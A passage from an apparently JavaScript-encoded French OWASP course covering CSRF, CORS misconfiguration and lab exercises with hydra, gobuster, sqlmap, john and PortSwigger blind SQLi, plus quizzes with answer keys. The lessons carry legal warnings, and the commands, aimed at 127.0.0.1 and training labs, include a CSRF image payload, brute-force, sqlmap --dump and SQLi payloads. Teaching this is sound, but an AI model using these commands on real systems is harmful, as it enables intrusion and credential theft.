              "Le serveur cible n'interprète pas de code : c'est un abus de confiance. Le serveur doit vérifier que la requête vient de son propre site. Dans le Top 10 2021, le CSRF n'a pas de catégorie dédiée : il touche A04 (conception), A07 (authentification) et A01 (contrôle d'accès)."
            ),
            h("Exemple de requête vulnérable"),
            p(
              "Une action qui change un état sans vérifier l'origine de la requête : un changement de mot de passe, un virement, une suppression."
            ),
            code(`// Une « image » piégée hébergée sur le site de l'attaquant :\n<img src="https://banque.fr/virement?montant=10000&dest=ATTAQUANT" alt="">\n\n// Le navigateur de la victime connectée à banque.fr envoie cette requête\n// AVEC son cookie de session. Si la banque ne vérifie pas l'origine :\n// le virement est exécuté sans que la victime ait cliqué sur un bouton.`),
            h("Comment le tester, pas à pas"),
            p(
              "En labo, on vérifie si une requête sensible est protégée contre les requêtes inter-sites. La méthode : prendre une requête POST authentique, la rejouer sans les en-têtes d'origine (Referer, Origin), et vérifier si le serveur l'accepte. Si un formulaire ne contient aucun jeton CSRF et que la requête passe sans vérification d'origine, la faille est prouvée."
            ),
            code(`# Rejouer la requête sans en-tête d'origine (exemple conceptuel, en labo) :\ncurl -X POST "http://127.0.0.1:8000/changer-mdp" \\\n     -d "nouveau_mdp=hacked123" \\\n     -b "session=<cookie_victime>" \\\n     -H "Origin: http://site-evil.example"\n# Si le serveur accepte le changement sans vérifier l'origine → CSRF`),
            h("Comment s'en protéger"),
            list(
              "Jeton CSRF : un secret généré par le serveur, injecté dans chaque formulaire, vérifié à chaque POST. C'est LA protection de référence.",
              "Attribut SameSite sur les cookies : SameSite=Lax ou Strict empêche l'envoi du cookie lors de requêtes inter-sites.",
              "Vérifier les en-têtes Origin et Referer sur les requêtes sensibles.",
              "Pour les actions très sensibles (virement, changement d'email) : exiger une re-saisie du mot de passe ou un MFA."
            ),
            callout(
              "Le jeton CSRF ne protège pas contre le XSS : si un attaquant exécute du JavaScript sur le site (A03), il peut lire le jeton dans la page. C'est pourquoi les deux protections se cumulent : CSP et encodage pour le XSS, jeton CSRF et SameSite pour le CSRF.",
              "info"
            ),
            callout(
              "Les tests CSRF se font uniquement sur tes labos. Construire une page piégée et l'envoyer à une vraie personne connectée à son site pour la faire agir à ton insu est un délit.",
              "danger"
            ),
            h("En résumé"),
            list(
              "CSRF = un site malveillant fait envoyer par ton navigateur une requête authentique au site cible, en profitant de ta session.",
              "Ce n'est pas une injection : c'est un abus de confiance entre navigateur et serveur.",
              "Protections : jeton CSRF, cookie SameSite, vérification d'Origin/Referer.",
              "Le CSRF touche A04, A07 et A01 dans le Top 10 2021 : pas de catégorie dédiée."
            )
          ]
        },
        {
          id: "owasp-lecon-17",
          title: "CORS misconfigurations",
          type: "theory",
          duration: "15 min",
          blocks: [
            h("Quand le site autorise tout le monde à lire ses réponses"),
            p(
              "CORS (Cross-Origin Resource Sharing, partage de ressources entre origines) est le mécanisme qui permet à un site d'autoriser un autre domaine à lire ses réponses. Par défaut, un navigateur bloque la lecture des réponses cross-origin : la page de banque.fr ne peut pas lire la réponse d'une API de assurance.fr. CORS est la soupape de sécurité qui ouvre cette lecture pour les origines autorisées."
            ),
            h("La misconfiguration classique"),
            p(
              "Le serveur répond avec un en-tête Access-Control-Allow-Origin: * accompagné d'Access-Control-Allow-Credentials: true. Le * veut dire « tout le monde » et les credentials signifient « y compris les cookies ». Le résultat : n'importe quel site peut lire les réponses de cette API, cookies de session inclus."
            ),
            code(`Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n# ← combinaison catastrophique : n'importe quel site peut lire les réponses, cookies inclus`),
            h("Pourquoi c'est dangereux"),
            p(
              "Une application mal configurée en CORS permet à un site malveillant de voler les données d'une API au nom d'un utilisateur connecté. L'attaquant héberge une page qui envoie une requête cross-origin à l'API et lit la réponse, car le serveur l'autorise explicitement. C'est un canal de vol silencieux : l'utilisateur n'a rien cliqué, le serveur n'a rien cassé."
            ),
            h("Comment le tester, pas à pas"),
            p(
              "En labo, on envoie une requête avec un en-tête Origin contrôlé et on observe si le serveur le reflète."
            ),
            code(`# Vérifier si le serveur reflète une origine arbitraire :\ncurl -s -I "http://127.0.0.1:8000/api/profil" -H "Origin: http://evil.example"\n# Réponse :\n# Access-Control-Allow-Origin: http://evil.example\n# Access-Control-Allow-Credentials: true\n# ← le serveur autorise un site tiers à lire la réponse avec les cookies`),
            h("La différence entre envoyer et lire"),
            p(
              "Important : un navigateur peut toujours ENVOYER une requête cross-origin (comme pour l'exfiltration d'un cookie par XSS) ; CORS ne bloque que la LECTURE de la réponse. C'est pourquoi une misconfiguration CORS avec credentials transforme cette limitation en porte ouverte : le site malveillant lit la réponse, donc les données."
            ),
            h("Comment s'en protéger"),
            list(
              "Liste blanche explicite de domaines autorisés : Access-Control-Allow-Origin avec une origine précise, jamais * avec credentials.",
              "Vérifier que Access-Control-Allow-Credentials n'est jamais couplé à une origine réfléchie arbitraire.",
              "Configurer CORS uniquement sur les endpoints qui en ont besoin.",
              "Combiner avec les autres protections : contrôles d'accès serveur, cookies HttpOnly et SameSite."
            ),
            callout(
              "CORS n'est pas une faille en soi : c'est un mécanisme légitime. Le problème est la misconfiguration : une origine réfléchie arbitraire ou un * avec credentials. Dans un rapport, on classe cela en A05 Security Misconfiguration.",
              "info"
            ),
            callout(
              "Les tests CORS se font uniquement sur tes labos : tu envoies tes propres en-têtes Origin vers tes propres applications. Tester une API tierce pour lire les données des utilisateurs est un délit.",
              "danger"
            ),
            h("En résumé"),
            list(
              "CORS autorise un domaine à lire les réponses d'un autre : le navigateur bloque la lecture par défaut.",
              "La misconfiguration : Access-Control-Allow-Origin: * avec Access-Control-Allow-Credentials: true.",
              "L'attaque : un site malveillant lit les réponses d'une API au nom d'un utilisateur connecté.",
              "La protection : liste blanche d'origines, jamais * avec credentials, CORS limité aux endpoints nécessaires."
            )
          ]
        },
        {
          id: "owasp-lecon-18",
          title: "Quiz intermédiaire 3 — A09, A10, XSS, CSRF, CORS",
          type: "quiz",
          duration: "10 min",
          blocks: [
            p(
              "Troisième bilan : journalisation, SSRF, XSS, CSRF et CORS. 6 questions. 80 % pour valider ce module."
            ),
            callout(
              "Relis les leçons 13 à 17 si une question te semble difficile : tout ce qui est demandé y est expliqué.",
              "info"
            )
          ],
          quiz: [
            {
              question: "La différence entre XSS réfléchi et XSS stocké :",
              options: [
                "L'un attaque le serveur, l'autre la base de données",
                "Le réfléchi vient de l'URL et s'exécute une fois ; le stocké vient de la base et s'exécute à chaque visite",
                "Le stocké nécessite un clic ; le réfléchi non",
                "Il n'y a aucune différence",
              ],
              answer: 1,
              explanation:
                "Le réfléchi exige qu'on piège un lien ; le stocké persiste dans la base et touche tous les visiteurs. Le DOM XSS, troisième type, s'exécute dans le navigateur sans aller au serveur.",
            },
            {
              question: "Quel en-tête restreint les scripts exécutables à certaines origines ?",
              options: [
                "X-Frame-Options",
                "Content-Security-Policy",
                "Strict-Transport-Security",
                "Set-Cookie",
              ],
              answer: 1,
              explanation:
                "La CSP dit au navigateur quelles origines ont le droit d'exécuter des scripts (et interdit les inline). X-Frame-Options concerne les iframes, HSTS le HTTPS.",
            },
            {
              question: "Le CSRF exploite surtout :",
              options: [
                "Une faille SQL",
                "La confiance du serveur dans des requêtes portant le cookie de session d'un utilisateur connecté",
                "Un mot de passe faible",
                "Un certificat expiré",
              ],
              answer: 1,
              explanation:
                "Un site tiers fait envoyer une requête authentique (avec cookie) au site cible. Protections : jeton CSRF, SameSite, vérification d'Origin/Referer.",
            },
            {
              question: "Quel est l'intérêt du sel (salt) dans le hachage d'un mot de passe ?",
              options: [
                "Rendre le hash plus long",
                "Garantir que deux mots de passe identiques produisent deux hashs différents",
                "Chiffrer le hash",
                "Accélérer le calcul",
              ],
              answer: 1,
              explanation:
                "Le sel aléatoire casse les tables précalculées et empêche de voir que deux comptes partagent le même mot de passe.",
            },
            {
              question: "Une fonction « importer une image depuis une URL » qui charge http://127.0.0.1:8081/admin correspond à :",
              options: [
                "A01 IDOR",
                "A03 SQLi",
                "A10 SSRF",
                "A05 Misconfiguration",
              ],
              answer: 2,
              explanation:
                "Le serveur fait une requête interne au nom de l'attaquant : c'est la définition exacte du SSRF.",
            },
            {
              question: "Pourquoi la catégorie A09 (logging) est-elle dangereuse en soi ?",
              options: [
                "Elle ralentit le serveur",
                "Sans journaux, une intrusion n'est ni détectée ni comprise",
                "Elle expose des secrets",
                "Elle supprime des données",
              ],
              answer: 1,
              explanation:
                "Absence de détection = dwell time en mois, pas d'éléments pour répondre, pas de preuve. Les journaux sont le filet de sécurité de tout le reste.",
            },
          ],
        },
      ],
    },
    {
      id: "owasp-module-4",
      title: "Mise en pratique : labos et outils",
      lessons: [
        {
          id: "owasp-lecon-19",
          title: "Monter ton laboratoire d'entraînement",
          type: "exercise",
          duration: "25 min",
          blocks: [
            h("Un terrain d'entraînement, pas le champ de bataille"),
            p(
              "Toutes les techniques des modules précédents doivent être pratiquées sur des machines que tu contrôles. Deux applications vulnérables volontairement, conçues pour l'apprentissage, vont te servir de terrain : DVWA (Damn Vulnerable Web Application) et OWASP Juice Shop. Dans ce cours, elles tournent en local sur 127.0.0.1."
            ),
            h("DVWA — l'école de l'OWASP"),
            p(
              "DVWA est une application PHP volontairement vulnérable, pensée pour les débutants. Elle regroupe les failles classiques du Top 10 : injection SQL, XSS, CSRF, command injection, brute force, upload de fichiers. Sa particularité : un niveau de sécurité configurable (low, medium, high, impossible) qui permet d'augmenter la difficulté progressivement."
            ),
            code(`# Lancer DVWA en local (conteneur Docker, 127.0.0.1)\ndocker run -d -p 80:80 vulnerables/web-dvwa\n# puis ouvrir http://127.0.0.1/ et compléter l'installation\n# identifiants par défaut : admin / password\n# régler le niveau de sécurité : DVWA Security → low\n\n# Lancer OWASP Juice Shop (le plus proche d'une vraie app moderne)\ndocker run -d -p 3000:3000 bkimminich/juice-shop\n# puis ouvrir http://127.0.0.1:3000/`),
            h("Pourquoi ces deux applications ?"),
            list(
              "DVWA : idéale pour comprendre chaque faille isolément, avec du code à lire et des niveaux de difficulté.",
              "Juice Shop : une boutique en ligne volontairement cassée, plus réaliste — on se sent comme sur un vrai pentest.",
              "Toutes deux incluent des exercices guidés et, pour Juice Shop, des « challenges » avec score."
            ),
            h("Les outils du niveau"),
            p(
              "Tu vas aussi installer la boîte à outils du pentester web. Sous Kali Linux ils sont préinstallés ; sinon, chaque outil s'installe individuellement :"
            ),
            code(`# Outils utilisés dans ce module (à installer selon ton OS)\n# hydra       → brute force de mots de passe\n# gobuster    → découverte de répertoires et de sous-domaines\n# sqlmap      → injection SQL semi-automatisée\n# john        → cassage de hashs de mots de passe\n# curl        → requêtes HTTP en ligne de commande (préinstallé)\n\n# Kali : déjà tout installé. Autre système (exemple Debian/Ubuntu) :\nsudo apt install hydra gobuster sqlmap john curl`),
            h("Les règles du labo"),
            p(
              "Trois règles d'or. Première : le labo est toujours isolé — tes machines virtuelles, tes conteneurs, tes locaux, tes labs cloud. Deuxième : les outils automatisés (sqlmap, hydra) ne tournent que sur tes cibles. Troisième : une attaque réussie se termine par un rapport, jamais par une exploitation réelle."
            ),
            callout(
              "Les tests contre des applications tierces réelles, même « pour voir », même « juste une requête », sont illégaux (art. 323-1 du code pénal) sauf autorisation écrite du propriétaire. Le labo local sert précisément à pratiquer sans risque.",
              "danger"
            ),
            h("En résumé"),
            list(
              "Labo = DVWA + Juice Shop en local sur 127.0.0.1, plus les outils hydra, gobuster, sqlmap, john, curl.",
              "DVWA : les failles une par une ; Juice Shop : le parcours d'un pentest réaliste.",
              "Isolation, cibles contrôlées, rapport : les trois règles d'or."
            )
          ]
        },
        {
          id: "owasp-lecon-20",
          title: "Brute force avec hydra",
          type: "exercise",
          duration: "18 min",
          blocks: [
            h("Essayer des mots de passe à l'échelle"),
            p(
              "La brute force consiste à essayer des millions de combinaisons de mots de passe jusqu'à trouver la bonne. À la main c'est impossible ; hydra le fait automatiquement sur des protocoles comme HTTP. Elle se combine avec des listes de mots de passe connus (wordlists) : rockyou, très utilisée, en contient des millions."
            ),
            h("Pourquoi ça marche encore"),
            p(
              "Malgré toutes les protections, une grande part des mots de passe réels reste faible : password, 123456, azerty, les prénoms. Le brute force est l'une des raisons de la catégorie A07 (Identification and Authentication Failures) du Top 10 2021. La vraie défense n'est pas un mot de passe « compliqué » mais la lenteur : limiter les tentatives, verrouiller après quelques essais, exiger un MFA."
            ),
            h("Étape par étape sur DVWA"),
            p(
              "DVWA propose une page de connexion vulnérable (aucune limitation de tentatives). C'est la cible idéale pour pratiquer."
            ),
            code(`# 1) Repérer la requête de connexion avec curl\ncurl -s -c cookies.txt "http://127.0.0.1/login.php" | grep -iE "form|input"\n# relever : l'URL de soumission, les noms des champs (username, password, Login)\n\n# 2) Tester une connexion manuelle\ncurl -s -b cookies.txt -c cookies.txt \\\n     -d "username=admin&password=wrong&Login=Login" \\\n     "http://127.0.0.1/login.php" | grep -i "failed\|incorrect"`),
            p("Une fois la requête comprise, on la passe à hydra. La syntaxe générale :"),
            code(`# 3) Lancer hydra : admin / rockyou, 8 tentatives en parallèle\nhydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n      -t 8 127.0.0.1 http-post-form \\\n      "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"`),
            list(
              "-l admin : nom d'utilisateur fixe (ici admin).",
              "-P rockyou.txt : la wordlist de mots de passe.",
              "-t 8 : 8 tentatives en parallèle.",
              "http-post-form : protocole de la cible (ici formulaire POST).",
              "\"/login.php:données:chaîne_d'échec\" : l'URL, les champs (^USER^ et ^PASS^ sont remplacés par hydra), et F= le texte qui signale un échec — hydra s'arrête quand le texte d'échec ne revient plus."
            ),
            p(
              "Quand hydra ne trouve plus le texte « Login failed », c'est que la combinaison est correcte : elle s'affiche dans le résultat comme [80][http-post-form] host: 127.0.0.1 login: admin password: password."
            ),
            h("La mesure de protection en face : rate limiting"),
            p(
              "La version « medium » de DVWA et, surtout, les vraies applications, ralentissent les tentatives : délai après 3 échecs, verrouillage du compte après 5, captcha, bloqueur d'IP. C'est précisément ce que hydra contourne avec des options comme -l (pause) ou des proxies d'IP. Dans un test autorisé, ces protections ralentissent la méthode — ce qui est exactement leur but."
            ),
            callout(
              "hydra ne s'utilise QUE sur tes labos ou avec autorisation écrite. Lançons-le uniquement sur 127.0.0.1 (DVWA local). Le taux de parallélisme (option -t) reste raisonnable pour ne pas faire tomber ta propre machine.",
              "danger"
            ),
            h("En résumé"),
            list(
              "La brute force = essayer des millions de mots de passe automatiquement (hydra + rockyou).",
              "La requête se prépare avec curl : on relève l'URL, les champs et le texte d'échec.",
              "La défense = limiter les tentatives, verrouiller les comptes, exiger le MFA (A07).",
              "Jamais contre une cible qui ne t'appartient pas."
            )
          ]
        },
        {
          id: "owasp-lecon-21",
          title: "Énumération de répertoires avec gobuster",
          type: "exercise",
          duration: "18 min",
          blocks: [
            h("Explorer ce qui n'est pas au menu"),
            p(
              "L'énumération de répertoires consiste à découvrir les fichiers et dossiers cachés d'un site : /admin, /backup, /config.php, /api/… Des pages que personne n'a mises au menu du site mais qui existent pourtant. L'outil de référence est gobuster, qui teste des milliers de chemins par seconde à partir d'une wordlist."
            ),
            h("Pourquoi c'est une étape clé"),
            p(
              "Ces pages cachées sont souvent les plus fragiles : anciennes, sans contrôle d'accès, contenant des données de test ou des sauvegardes. Découvrir /backup/ ou /phpmyadmin est souvent la porte d'entrée vers A01 (broken access control) ou A05 (misconfiguration). L'énumération fait partie de toute la méthodologie : on ne peut attaquer que ce qu'on connaît."
            ),
            code(`# Énumérer les répertoires du site avec gobuster\ngobuster dir -u http://127.0.0.1/dvwa \\\n              -w /usr/share/wordlists/dirb/common.txt \\\n              -t 50\n# à regarder : 200 (répertoire/fichier accessible) vs 403 (existe mais interdit)\n# exemple de sortie :\n# /admin                (Status: 200)\n# /config.php           (Status: 200)\n# /phpmyadmin           (Status: 200)`),
            h("Comprendre les codes de statut"),
            p(
              "Tout pentester lit ces codes : 200 OK (existe et accessible), 403 Forbidden (existe mais refuse), 301 (redirige), 404 (n'existe pas). Un 403 n'est pas un échec : c'est une cible potentielle — un dossier existe mais bloque. Il vaut mieux un 403 qu'un 404."
            ),
            h("Étape par étape : exploitation d'un dossier oublié"),
            p(
              "Sur une application réelle, on affinerait ensuite le découvert : on ré-énumère le dossier, on liste son contenu, on regarde les fichiers sensibles."
            ),
            code(`# Affiner : énumérer dans le sous-dossier découvert\ngobuster dir -u http://127.0.0.1/dvwa/admin \\\n              -w /usr/share/wordlists/dirb/common.txt -t 50\n\n# Chercher des fichiers spécifiques\ngobuster dir -u http://127.0.0.1/dvwa \\\n              -x php,zip,backup,env,txt \\\n              -w /usr/share/wordlists/dirb/common.txt -t 50\n# une sauvegarde config.php.bak est un trésor : elle contient souvent les identifiants DB`),
            h("La défense en face"),
            list(
              "Ne rien exposer d'inutile : supprimer les fichiers de test, de backup, les configs démo.",
              "Protéger les dossiers administratifs par le réseau (VPN, whitelist IP) plutôt que par l'URL seule.",
              "Restreindre les erreurs : renvoyer 404 au lieu de 403 pour les dossiers cachés (on ne révèle pas leur existence)."
            ),
            callout(
              "L'énumération de répertoires sur une cible réelle sans autorisation est aussi un délit que les autres techniques. Sur ton labo, c'est le moment de comprendre la différence 404 vs 403 : les sites blindés « ne montrent rien ».",
              "warning"
            ),
            h("En résumé"),
            list(
              "gobuster découvre les répertoires cachés en testant des milliers de chemins.",
              "Les fichiers oubliés (backup, config, admin) sont des portes d'entrée fréquentes vers A01 et A05.",
              "Lire les codes de statut : 200 accessible, 403 existe mais bloqué, 404 n'existe pas.",
              "La défense : ne rien exposer d'inutile, 404 à la place de 403, protection réseau des zones admin."
            )
          ]
        },
        {
          id: "owasp-lecon-22",
          title: "Injection SQL automatisée avec sqlmap",
          type: "exercise",
          duration: "20 min",
          blocks: [
            h("Quand l'outil fait le travail d'injection"),
            p(
              "sqlmap automatise la détection et l'exploitation des injections SQL : il teste les paramètres d'une requête, détecte le type de base (MySQL, PostgreSQL, SQLite…), la technique (erreur, aveugle booléenne, temporelle), puis peut extraire les bases de données, tables et données. C'est l'outil roi des tests A03 — mais un couteau suisse qu'on ne sort pas à l'aveugle."
            ),
            h("La base : partir d'une requête réelle"),
            p(
              "sqlmap se nourrit d'une requête HTTP qu'on lui donne. On capture d'abord une requête réelle (avec curl), on la sauvegarde dans un fichier, puis on indique le paramètre à tester."
            ),
            code(`# 1) Capture d'une requête réelle (exemple : page d'un produit)\ncurl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n     > /tmp/requete.txt\n# le fichier contient l'URL, le cookie de session (dvwa le vérifie), le paramètre\n\n# 2) Lancer sqlmap sur le paramètre id\nsqlmap -r /tmp/requete.txt -p id --batch --level 2`),
            p(
              "L'option --batch répond « oui » à toutes les questions interactives ; --level 2 augmente la profondeur des tests. sqlmap affiche alors le type de base détectée et les techniques possibles."
            ),
            h("L'étape suivante : extraire la base"),
            p(
              "Une fois la vulnérabilité confirmée, on demande les données. C'est ici qu'il faut être prudent : chaque extraction envoie des requêtes à la cible."
            ),
            code(`# Lister les bases, puis les tables, puis les données (en labo uniquement)\nsqlmap -r /tmp/requete.txt -p id --batch --dbs\nsqlmap -r /tmp/requete.txt -p id --batch -D dvwa --tables\nsqlmap -r /tmp/requete.txt -p id --batch -D dvwa -T users --dump`),
            p(
              "La dernière commande affiche le contenu de la table users : identifiants et hashs. C'est le résultat classique d'un pentest A03 : toute la base est compromise."
            ),
            h("Quand NE PAS utiliser sqlmap"),
            list(
              "Quand la cible n'est pas autorisée : sqlmap peut envoyer des centaines de requêtes, il ne passe pas inaperçu.",
              "Quand on veut comprendre : pour apprendre, fais les injections à la main d'abord, sqlmap ensuite pour la vitesse.",
              "Sur les requêtes avec impact : un --dump sur une table sensible charge l'application — en production c'est risqué même autorisé."
            ),
            callout(
              "sqlmap est un outil d'automatisation puissant : il teste, détecte et extrait tout seul. Sa puissance fait sa dangerosité — un seul lancement sur une cible non autorisée est un délit et crée des preuves. Sur ton labo DVWA, c'est le moment parfait de comparer une injection manuelle (leçon 8) et son résultat automatisé.",
              "danger"
            ),
            h("En résumé"),
            list(
              "sqlmap = détection et exploitation automatisées de l'injection SQL.",
              "On lui donne une requête réelle (-r fichier), un paramètre (-p), et il détecte base + techniques.",
              "Extraction : --dbs, -D base -T table --dump.",
              "Manuel d'abord pour comprendre, sqlmap ensuite pour aller vite — uniquement sur les cibles autorisées."
            )
          ]
        },
        {
          id: "owasp-lecon-23",
          title: "Casser des hashs avec john",
          type: "exercise",
          duration: "18 min",
          blocks: [
            h("Les mots de passe ne sont jamais stockés en clair"),
            p(
              "Dans la table users extraite (leçon 22), les mots de passe sont des hashs : des empreintes à sens unique calculées par une fonction de hachage. On ne peut pas « inverser » un hash, mais on peut en calculer des millions (sur des mots de passe probables) et comparer : c'est le cassage de hashs. L'outil de référence est John the Ripper (john)."
            ),
            h("D'abord comprendre le hash"),
            p(
              "Tout hash a un format et une fonction. MD5, SHA-1 sont des fonctions rapides, donc cassables très vite ; bcrypt, scrypt, Argon2 sont lentes et salées, donc bien plus coûteuses à casser. john devine souvent le format tout seul ; sinon, on peut l'aider."
            ),
            code(`# Exemple de hash extrait d'une base :\necho "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/hash.txt\n\n# 1) Laisser john identifier le format et le casser avec une wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt\n\n# 2) Afficher le résultat\njohn --show /tmp/hash.txt\n# sortie : 5f4dcc3b5aa765d61d8327deb882cf99:password\n# (c'est le hash MD5 de "password")`),
            h("Wordlists et variantes"),
            p(
              "Une wordlist est une liste de mots de passe probables. rockyou en contient des millions. Quand la wordlist échoue, on passe aux règles : john peut transformer chaque mot (« password » → « Password », « password1 », « p@ssword »…) pour multiplier les chances. C'est le mode --rules."
            ),
            code(`# Ajouter des règles de transformation à la wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt --rules /tmp/hash.txt\n\n# Varier la longueur des mots de passe générés (attaque par masque)\njohn --mask='?l?l?l?l?l' /tmp/hash.txt`),
            h("Pourquoi certains hashs résistent"),
            p(
              "Un hash MD5 d'un mot de passe dans rockyou se casse en secondes. Un hash bcrypt d'un mot de passe aléatoire peut prendre des années. La différence vient du hachage : rapide (MD5/SHA-1, cassable) versus lent et salé (bcrypt/Argon2, résistant). C'est pourquoi les applications modernes utilisent des fonctions lentes (leçon 7) : rendre le cassage économiquement impossible."
            ),
            callout(
              "john ne casse que des hashs que tu possèdes légalement : tes fichiers, tes labos, les hashs de tes propres bases d'entraînement. Casser des hashs volés, même « par curiosité », alimente des violations de données.",
              "danger"
            ),
            h("En résumé"),
            list(
              "Un hash ne s'inverse pas : il se compare (calculer des milliards de candidats).",
              "john + rockyou : le duo de base. --rules et --mask étendent les chances.",
              "Fonctions rapides (MD5, SHA-1) = cassables ; fonctions lentes et salées (bcrypt, Argon2) = résistantes.",
              "Le cassage ne s'applique qu'aux hashs que tu possèdes."
            )
          ]
        },
        {
          id: "owasp-lecon-24",
          title: "Labs PortSwigger : la méthode pas à pas",
          type: "exercise",
          duration: "20 min",
          blocks: [
            h("Un banc d'essai en ligne pour toutes les failles"),
            p(
              "Les labs PortSwigger (portswigger.net/web-security/all-labs) sont des environnements en ligne, gratuits, où chaque exercice correspond à une faille précise : SQLi, XSS, SSRF, CORS, CSRF, access control, autant de « machines » à exploiter. Chaque lab a un objectif : « Se connecter comme admin », « Lire le contenu du /etc/passwd »… et se valide automatiquement."
            ),
            h("La méthode en 6 étapes (valable partout)"),
            list(
              "1. Lire l'énoncé : l'objectif exact et les indices fournis (l'URL, la fonctionnalité à attaquer).",
              "2. Explorer l'application comme un utilisateur normal : chaque page, chaque fonction, chaque champ.",
              "3. Identifier la surface d'attaque : les entrées utilisateur (paramètres, cookies, en-têtes, fichiers).",
              "4. Tester une hypothèse simple avant de sortir les outils : une apostrophe dans un paramètre, un <script> dans un champ.",
              "5. Confirmer et exploiter : affiner le payload jusqu'à valider l'objectif.",
              "6. Documenter : ce que tu as envoyé, la réponse, le pourquoi."
            ),
            h("Un exemple concret : lab « blind SQLi »"),
            p(
              "Prenons un lab d'injection aveugle booléenne : le site affiche « Bienvenue » ou « Erreur » selon le résultat d'une condition SQL. On ne voit jamais de données, mais on peut faire des questions oui/non à la base."
            ),
            code(`# Hypothèse : le paramètre TrackingId injecte dans WHERE\nGET /product?productId=1 HTTP/1.1\nCookie: TrackingId=x' AND '1'='1\n# réponse : page normale (la condition est vraie)\n\nCookie: TrackingId=x' AND '1'='2\n# réponse : erreur (la condition est fausse)\n# → la condition SQL contrôle l'affichage : injection aveugle confirmée\n\n# Ensuite on vérifie des faits, un par un :\nCookie: TrackingId=x' AND (SELECT 'a' FROM users WHERE username='administrator')='a'`),
            p(
              "À chaque étape, la réponse (normal ou erreur) répond « vrai ou faux ». Ce binaire permet de tester toutes les conditions : existence d'un utilisateur, longueur du mot de passe, puis chaque caractère. C'est long à la main — c'est là qu'intervient l'automatisation (intruder, scripts), mais il faut d'abord maîtriser le principe."
            ),
            h("Comment utiliser les labs dans ce cours"),
            list(
              "Après chaque leçon théorique, cherche le lab correspondant (le site classe les labs par thème).",
              "Résous-le d'abord à la main, puis regarde la solution officielle pour comparer ta méthode.",
              "Reprends la même faille sur DVWA et Juice Shop : les labs sont des exercices, ton labo est le terrain libre.",
              "Note chaque lab dans ton carnet : objectif, entrée attaquée, payload, résultat."
            ),
            callout(
              "Les labs PortSwigger sont des environnements officiellement destinés à l'entraînement : ils se prêtent à l'exploitation. C'est le bon endroit pour pratiquer l'exploitation avancée sans risque juridique.",
              "info"
            ),
            h("En résumé"),
            list(
              "Les labs PortSwigger : un exercice par faille, avec objectif et validation automatique.",
              "Méthode en 6 étapes : lire, explorer, identifier, tester simple, exploiter, documenter.",
              "L'injection aveugle transforme la base de données en réponses oui/non.",
              "Labs pour apprendre, labo local pour pratiquer, rapport pour restituer."
            )
          ]
        },
        {
          id: "owasp-lecon-25",
          title: "Quiz intermédiaire 4 — outils et labos",
          type: "quiz",
          duration: "10 min",
          blocks: [
            p(
              "Quatrième bilan : les outils du pentester (hydra, gobuster, sqlmap, john) et la méthode. 6 questions. 80 % pour valider ce module."
            ),
            callout(
              "Si une question concerne un outil, relis la leçon correspondante : la réponse y est expliquée.",
              "info"
            )
          ],
          quiz: [
            {
              question: "Quel outil automatise le cassage de hashs de mots de passe ?",
              options: [
                "hydra",
                "gobuster",
                "john",
                "sqlmap",
              ],
              answer: 2,
              explanation:
                "john (John the Ripper) compare des millions de candidats à un hash. hydra fait du brute force réseau, gobuster de l'énumération, sqlmap de l'injection SQL.",
            },
            {
              question: "Dans hydra, les marqueurs ^USER^ et ^PASS^ dans la chaîne du formulaire indiquent :",
              options: [
                "Les champs à afficher dans le rapport",
                "Les emplacements où hydra insère le nom d'utilisateur et le mot de passe à tester",
                "Les mots de passe interdits",
                "Le chemin du fichier de wordlist",
              ],
              answer: 1,
              explanation:
                "hydra remplace ^USER^ et ^PASS^ par chaque combinaison de la liste pendant le test du formulaire http-post-form.",
            },
            {
              question: "Un répertoire qui renvoie 403 Forbidden pendant une énumération gobuster :",
              options: [
                "N'existe pas, c'est un faux positif",
                "Existe et refuse l'accès : c'est une cible à creuser",
                "Est bloqué définitivement, on l'oublie",
                "Est un piège du serveur",
              ],
              answer: 1,
              explanation:
                "Un 403 révèle l'existence du dossier (contrairement au 404). On note l'adresse et on explore : contrôle d'accès (A01) ou misconfiguration (A05) potentiels.",
            },
            {
              question: "Quelle commande sqlmap extrait le contenu de la table users de la base dvwa ?",
              options: [
                "sqlmap --dump",
                "sqlmap -r fichier -p id -D dvwa -T users --dump",
                "sqlmap -r fichier --passwords",
                "sqlmap --dbs",
              ],
              answer: 1,
              explanation:
                "On indique la requête (-r), le paramètre (-p), la base (-D), la table (-T) puis --dump pour afficher le contenu.",
            },
            {
              question: "Pourquoi un hash bcrypt résiste-t-il mieux qu'un hash MD5 au cassage ?",
              options: [
                "bcrypt produit des hashs plus longs",
                "bcrypt est une fonction lente, avec un coût de calcul volontairement élevé",
                "bcrypt ne peut pas être utilisé par john",
                "MD5 est salé, bcrypt ne l'est pas",
              ],
              answer: 1,
              explanation:
                "bcrypt ralentit volontairement le calcul (facteur de coût), donc chaque tentative coûte cher : le cassage devient économiquement impossible.",
            },
            {
              question: "L'énoncé d'un lab PortSwigger est important car il indique :",
              options: [
                "La couleur de la page à obtenir",
                "L'objectif exact à valider (se connecter comme admin, lire /etc/passwd…)",
                "Le mot de passe à utiliser",
                "La version de sqlmap à employer",
              ],
              answer: 1,
              explanation:
                "Chaque lab définit un objectif mesurable. Toute la méthode (explorer, identifier, tester, exploiter) est guidée par cet objectif.",
            },
          ],
        },
      ],
    },
    {
      id: "owasp-module-5",
      title: "Chaîne d'attaque et restitution",
      lessons: [
        {
          id: "owasp-lecon-26",
          title: "Chaîne d'attaque complète sur Juice Shop",
          type: "exercise",
          duration: "25 min",
          blocks: [
            h("Tout connecter, de l'énumération à la validation"),
            p(
              "Ce module réunit tout le cours dans un parcours unique : on part d'une boutique en ligne volontairement vulnérable (Juice Shop) et on enchaîne les techniques pour montrer comment une attaque réelle se déroule, étape par étape. L'objectif n'est pas de trouver dix failles isolées mais de construire un scénario : de la découverte à la validation, puis au rapport."
            ),
            h("Étape 1 — Reconnaissance"),
            p(
              "Tout commence par observer : qu'est-ce que cette application, quels sont ses composants, quelle surface d'attaque offre-t-elle ?"
            ),
